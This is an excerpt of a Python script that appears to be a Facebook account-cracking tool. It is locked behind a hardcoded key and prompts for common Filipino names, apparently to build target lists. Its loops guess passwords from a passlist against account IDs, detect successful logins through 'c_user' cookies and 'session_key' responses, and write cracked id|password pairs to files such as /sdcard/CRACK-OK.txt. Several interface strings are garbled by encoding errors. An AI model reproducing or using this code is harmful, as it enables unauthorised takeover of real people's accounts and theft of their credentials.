...
tokenku=[]
  # LOGIN_KEY
correct_username = 'SHIKIDAKS'
key = 'SHIKIDAKS'
while key == 'SHIKIDAKS':
    username = input('\33[0;97m[â€¢]\33[1;96mâ€¢â”€â”€â”€âž¤\33[1;92mENTER KEY \33[1;91m: ')

    if username == correct_username:
        print('\33[1;37m--------\33[0;97m[â€¢]\33[1;32m LOGGED IN SABER TOOL SUCCESSFULLYâ¤ï¸')
        time.sleep(1)
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                open(f'/sdcard/CRACK-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                print(f'\r\r\033[1;32m [SHIKI-OK] %s | %s'%(ids,pas))
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;126m [SHIKI-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/CRACK-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;126m [CRACK-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/SHIKI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
...
def gml():
                ...
                clear()
                pcp.append(f'y')
                print('\033[1;32m Name  example:  Jimboy, Jamaica, Jonel ')
                code = input(' First name : ')
                print(' Name Example : Ocampo, Mahusay, Torres')
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[SHIKI-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[CRACK-CP] '+idf+' | '+ps+'\033[0;97m')
